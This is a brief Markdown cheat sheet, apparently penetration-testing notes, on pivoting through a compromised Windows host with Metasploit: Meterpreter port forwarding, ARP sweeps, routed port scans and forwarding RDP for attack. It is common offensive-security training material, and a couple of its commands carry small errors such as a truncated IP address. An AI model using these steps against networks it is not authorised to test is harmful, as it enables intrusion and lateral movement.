# Metasploit Port Forwarding

## Compromised Machine is Running Services that are Only Accessible from within the Network and that Machine

* To access that Port we can do this in Meterpreter:

```bash
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
```

```bash
portfwd add -l 3306 -p 3306 -r 192.168.222
```

* now we can access this port on our machine locally like this

```bash
nc 127.0.0.1 3306
```

## Ping-Sweep the Network

* scan the network to see what devices we can target
* in this example we already have a meterpreter shell on a windows machine with SYSTEM privileges
* this command will output all the devices on the network

```bash
meterpreter > run arp_scanner -r 192.168.1.0/24
```

## Scan Each Host

* now that there is a list of all available machines, port scan them
* port scan through Metasploit, using this module:

```bash
use auxiliary/scanner/portscan/tcp
```

* run that module and it will only scan machines in the network we are already on
* connect us into the second network
* on the already pwn'd machine, run this command

```bash
ipconfig
```

* now  add the second network as a new route in Metasploit
* background our session, and then do this

```bash
#the ip address and the subnet mask, and then the meterpreter session
route add 192.168.1.101 255.255.255.0 1
```

* now run our port scanning module

```bash
use auxiliary/scanner/portscan/tcp
```

## Attack a specific port

* in order to attack a specific port, forward it like this

```bash
portfwd add -l 3389 -p 3389 -r 192.168.1.222
```

## References

* This is a good video-explanation
* [https://www.youtube.com/watch?v=c0XiaNAkjJA](https://www.youtube.com/watch?v=c0XiaNAkjJA)
* [https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
* [http://ways2hack.com/how-to-do-pivoting-attack/](http://ways2hack.com/how-to-do-pivoting-attack/)

